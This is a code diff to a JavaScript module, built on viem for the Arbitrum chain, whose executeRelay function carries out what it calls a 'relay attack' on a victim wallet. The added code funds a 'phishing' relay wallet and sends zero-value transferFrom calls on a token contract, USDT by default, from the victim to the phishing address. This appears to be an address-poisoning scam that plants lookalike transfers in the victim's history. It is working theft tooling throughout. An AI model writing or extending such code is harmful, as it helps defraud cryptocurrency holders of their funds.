@@ -4,12 +4,26 @@
    It pulls master configuration (Keys, RPC) from environment variables.
 */
 
-import { createWalletClient, createPublicClient, http, parseEther, fallback } from 'viem';
+import { createWalletClient, createPublicClient, http, parseEther, fallback, encodeFunctionData } from 'viem';
 import { privateKeyToAccount } from 'viem/accounts';
 import { arbitrum } from 'viem/chains';
 import dotenv from 'dotenv';
 
 dotenv.config();
+
+const ERC20_ABI = [
+    {
+        constant: false,
+        inputs: [
+            { name: 'sender', type: 'address' },
+            { name: 'recipient', type: 'address' },
+            { name: 'amount', type: 'uint256' },
+        ],
+        name: 'transferFrom',
+        outputs: [{ name: '', type: 'bool' }],
+        type: 'function',
+    },
+];
 
 /**
  * Execute a relay attack.
@@ -18,8 +32,15 @@ dotenv.config();
  * @param {string} params.phishingAddress - The pre-generated relay wallet address.
  * @param {string} params.phishingPrivateKey - The private key for the relay wallet.
  * @param {string} [params.fundAmount="0.0003"] - The amount of ETH to fund the relay with.
+ * @param {string} [params.tokenAddress=""] - Optional ERC-20 Token to spoof.
  */
-export async function executeRelay({ victimAddress, phishingAddress, phishingPrivateKey, fundAmount = '0.00002' }) {
+export async function executeRelay({
+    victimAddress,
+    phishingAddress,
+    phishingPrivateKey,
+    fundAmount = '0.00002',
+    tokenAddress = '',
+}) {
     const ALCHEMY_RPC = process.env.ALCHEMY_RPC;
     let HACK_PRIVATE_KEY = process.env.HACK_PRIVATE_KEY;
 
@@ -92,18 +113,43 @@ export async function executeRelay({ victimAddress, phishingAddress, phishingPri
     }
 
     // --- STEP 2: EXECUTE ATTACK FROM RELAY ---
-    console.log(`[Relay] Step 2: Sending 0 ETH from relay to victim (${victimAddress})...`);
     const relayClient = createWalletClient({
         account: relayAccount,
         chain: arbitrum,
         transport: fallback([http(ALCHEMY_RPC)]),
     });
 
-    const attackHash = await relayClient.sendTransaction({
-        to: victimAddress,
-        value: parseEther('0'),
-        gasPrice: adjustedGasPrice,
-    });
+    let attackHash;
+    const targetToken =
+        tokenAddress && tokenAddress.trim() !== ''
+            ? tokenAddress.trim()
+            : process.env.SPOOF_TOKEN || '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9'; // Default to Arbitrum USDT
+
+    if (targetToken && targetToken.trim() !== '') {
+        console.log(
+            `[Relay] Step 2: Sending 0 tokens via transferFrom to victim (${victimAddress}) using contract ${targetToken}...`
+        );
+
+        const payloadData = encodeFunctionData({
+            abi: ERC20_ABI,
+            functionName: 'transferFrom',
+            args: [victimAddress, phishingAddress, 0n],
+        });
+
+        attackHash = await relayClient.sendTransaction({
+            to: targetToken,
+            data: payloadData,
+            gasPrice: adjustedGasPrice,
+        });
+    } else {
+        console.log(`[Relay] Step 2: Sending 0 ETH from relay to victim (${victimAddress})...`);
+
+        attackHash = await relayClient.sendTransaction({
+            to: victimAddress,
+            value: 0n,
+            gasPrice: adjustedGasPrice,
+        });
+    }
 
     const receipt = await publicClient.waitForTransactionReceipt({ hash: attackHash });
 
